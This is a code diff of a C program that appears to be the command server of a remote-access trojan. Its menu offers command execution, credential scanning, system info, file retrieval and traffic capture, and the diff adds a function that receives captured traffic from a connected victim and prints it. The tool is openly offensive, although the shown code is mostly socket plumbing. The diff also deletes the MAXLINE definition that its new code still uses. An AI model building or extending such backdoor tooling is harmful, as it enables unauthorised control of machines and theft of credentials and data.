@@ -10,7 +10,6 @@
 #include "../commonutils.h"
 
 #define PORT 8080
-#define MAXLINE 1024
 
 char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n";
 
@@ -139,7 +138,26 @@ void retrieve_file(int clientfd)
 
 void capturetraffic(int clientfd)
 {
-    
+    char capturedTraffic[MAXLINE*20]="";
+    char buffer[MAXLINE];
+    int total_bytes_read = 0;
+    int bytes_read;
+
+    capturedTraffic[0]=0;
+
+    while((bytes_read=read(clientfd,buffer,sizeof(buffer)-1))>0)
+    {
+        buffer[bytes_read] = '\0'; 
+        char *end_marker = strstr(buffer, "<END_OF_DATA>");
+        if(end_marker!=NULL)
+        {
+            *end_marker='\0';
+            myWrite(buffer,STDOUT_FILENO);
+            break;
+        }
+        myWrite(buffer,STDOUT_FILENO);
+    }
+
 }
 
 int main()
@@ -224,6 +242,7 @@ int main()
             //flushSocketRead(connfd);
             case '5':
             write(connfd,"5",1);
+            capturetraffic(connfd);
             break;
             default:
             break;
